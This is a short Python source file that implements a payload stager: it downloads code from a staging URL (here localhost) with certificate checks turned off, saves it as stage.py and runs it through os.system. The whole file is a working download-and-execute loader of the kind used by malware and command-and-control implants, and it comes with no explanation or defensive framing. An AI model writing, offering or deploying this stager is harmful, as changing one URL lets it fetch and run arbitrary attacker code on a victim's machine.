import requests
import os

STAGER_URL = "https://127.0.0.1:5000/stage"

def fetch_payload(channel="https"):
    try:
        r = requests.get(STAGER_URL, timeout=10, verify=False)
        if r.status_code == 200:
            with open("stage.py", "w") as f:
                f.write(r.text)
            os.system("python3 stage.py")
    except Exception as e:
        print(f"[staging] Fetch error: {e}")
